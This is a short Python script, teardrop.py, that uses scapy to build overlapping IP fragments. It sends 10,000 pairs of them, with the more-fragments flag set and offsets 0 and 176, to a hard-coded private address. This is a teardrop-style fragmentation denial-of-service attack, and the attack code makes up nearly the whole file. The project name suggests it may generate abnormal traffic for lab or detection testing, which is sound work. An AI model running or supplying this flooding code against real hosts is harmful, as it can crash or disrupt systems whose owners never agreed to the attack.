# #!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Project -> @File : Abnormal -> teardrop.py
# @Author   : Taknife
# @IDE      : PyCharm
# @Time     : 2022/9/26 10:35

"""
-------------------- Function --------------------
Desc: 
---------------------- End -----------------------
"""

from scapy.all import *
import random
import time


def crafting_packets(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
    network_layer = IP(
        id = 28752,
        flags = flags,
        frag = frag,
        ttl = 128,
        proto = proto,
        dst = dst
    )
    data = data
    pkt = network_layer / data
    return pkt


def send_packers(pkt):
    send(pkt)


if __name__ == '__main__':
    with open("data.txt", "r") as f:
        data = f.read()
        # print(data)
    for i in range(0, 10000):
        pkt = crafting_packets(1, 0, 17, data=data)
        send_packers(pkt)
        pkt = crafting_packets(1, 176, 17, data=data)
        send_packers(pkt)
        time.sleep(0.05)